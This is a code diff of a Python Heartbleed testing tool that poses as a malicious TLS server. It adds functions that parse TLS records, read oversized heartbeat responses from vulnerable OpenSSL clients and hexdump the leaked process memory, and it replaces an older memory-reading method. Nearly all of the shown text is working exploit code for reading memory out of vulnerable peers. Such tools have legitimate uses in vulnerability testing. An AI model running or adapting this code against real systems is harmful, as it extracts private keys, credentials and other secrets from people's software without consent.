@@ -80,6 +80,126 @@ def hexdump(data):
 class Failure(Exception):
     pass
 
+class RecordParser(object):
+    record_s = struct.Struct('!BHH')
+    def __init__(self):
+        self.buffer = bytearray()
+        self.buffer_len = 0
+        self.record_hdr = None
+
+    def feed(self, data):
+        self.buffer += data
+        self.buffer_len += len(data)
+        if self.record_hdr is None and self.buffer_len >= self.record_s.size:
+                self.record_hdr = self.record_s.unpack_from(self.buffer)
+
+    def bytes_needed(self):
+        '''Zero or lower indicates that a fragment is available'''
+        expected_len = self.record_s.size
+        if self.record_hdr is not None:
+            expected_len += self.record_hdr[2]
+        return expected_len - self.buffer_len
+
+    def get_record(self, partial=False):
+        if self.buffer_len < self.record_s.size:
+            return None
+
+        record_type, sslver, fragment_len = self.record_hdr
+        record_len = self.record_s.size + fragment_len
+
+        if not partial and self.buffer_len < record_len:
+            return None
+
+        fragment = self.buffer[self.record_s.size:record_len]
+
+        del self.buffer[:record_len]
+        self.buffer_len -= record_len
+        self.record_hdr = None
+
+        return record_type, sslver, fragment
+
+def read_record(sock, timeout, partial=False):
+    rparser = RecordParser()
+    end_time = time.time() + timeout
+    error = None
+
+    bytes_to_read = rparser.bytes_needed()
+    while bytes_to_read > 0 and timeout > 0:
+        rl, _, _ = select.select([sock], [], [], timeout)
+
+        if not rl:
+            e = socket.timeout('Timeout while waiting for bytes')
+            break
+
+        try:
+            rparser.feed(rl[0].recv(bytes_to_read))
+        except socket.error as e:
+            error = e
+            break # Connection reset?
+
+        bytes_to_read = rparser.bytes_needed()
+        timeout = end_time - time.time()
+
+    return rparser.get_record(partial=partial), error
+
+def read_hb_response(sock, timeout):
+    end_time = time.time() + timeout
+    memory = bytearray()
+    hb_len = 0xffff
+    read_error = None
+    alert = None
+
+    # OpenSSL actually returns four fragments of size 0x4000 each. The first
+    # three bytes of the first fragment is type + len, so skip that.
+    while 3 + len(memory) < hb_len and timeout > 0:
+        record, read_error = read_record(sock, timeout, partial=True)
+        if not record:
+            break
+
+        record_type, _, fragment = record
+        if record_type == 24:
+            if not memory: # First Heartbeat
+                # Check for enough room for type + len
+                if len(fragment) < 3:
+                    if read_error: # Ignore error due to partial read
+                        break
+                    raise Failure('Response too small')
+                # Sanity check, should not happen with OpenSSL
+                if fragment[0] != 2:
+                    raise Failure('Expected Heartbeat response')
+
+                hb_len, = struct.unpack_from('!H', fragment, 1)
+                memory += fragment[2:]
+            else: # Heartbeat continuation
+                memory += fragment
+        elif record_type == 7 and len(fragment) == 2: # Alert
+            alert = fragment
+            break
+        else:
+            # Cannot tell whether vulnerable or not!
+            raise Failure('Unexpected record type {}'.format(record_type))
+
+        timeout = end_time - time.time()
+
+    if memory:
+        print('Client returned {0} ({0:#x}) bytes'.format(len(memory)))
+        hexdump(memory)
+
+    # Check for Alert (sent by NSS)
+    if alert:
+        lvl, desc = alert
+        lvl = 'Warning' if lvl == 1 else 'Fatal'
+        print('Got Alert, level={}, description={}'.format(lvl, desc))
+        if not memory:
+            print('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
+            return None
+
+    # Do not print error if we have memory, server could be crashed, etc.
+    if read_error and not memory:
+        print('Did not receive heartbeat response! ' + str(read_error))
+
+    return memory
+
 class RequestHandler(socketserver.BaseRequestHandler):
     def handle(self):
         self.args = self.server.args
@@ -154,45 +274,11 @@ class RequestHandler(socketserver.BaseRequestHandler):
         self.request.sendall(make_heartbeat(self.sslver))
 
         # (3) Buggy OpenSSL will throw 0xffff bytes, fixed ones stay silent
-        if not self.read_memory(self.request, self.args.timeout):
+        memory = read_hb_response(self.request, self.args.timeout)
+        # If memory is None, then it is not vulnerable for sure. Otherwise, if
+        # empty, then it *may* be invulnerable
+        if memory is not None and not memory:
             print("Possibly not vulnerable")
-
-    def read_memory(self, sock, timeout):
-        end_time = time.time() + timeout
-        buffer = bytearray()
-        wanted_bytes = 0xffff
-
-        while wanted_bytes > 0 and timeout > 0:
-            rl, _, _ = select.select([sock], [], [], timeout)
-
-            if not rl:
-                break
-
-            try:
-                data = rl[0].recv(wanted_bytes)
-            except socket.error as e:
-                if not len(buffer):
-                    print('Did not receive heartbeat response! ' + str(e))
-                break # Connection reset?
-
-            if not data: # EOF
-                break
-            buffer += data
-            wanted_bytes -= len(data)
-            timeout = end_time - time.time()
-
-        # Check for Alert (sent by NSS)
-        alert = bytearray.fromhex('15 ' + self.sslver + ' 00 02')
-        if len(buffer) == 7 and buffer[0:5] == alert and buffer[5] in (1, 2):
-            lvl = 'Warning' if buffer[5] == 1 else 'Fatal'
-            print('Got Alert, level=' + lvl + ', description=' + str(buffer[6]))
-            print('Not vulnerable! (Heartbeats disabled or not OpenSSL)')
-            return 7
-
-        if len(buffer) > 0:
-            print('Client returned {0} ({0:#x}) bytes'.format(len(buffer)))
-            hexdump(buffer)
-        return len(buffer) > 0
 
     def expect(self, cond, what):
         if not cond:
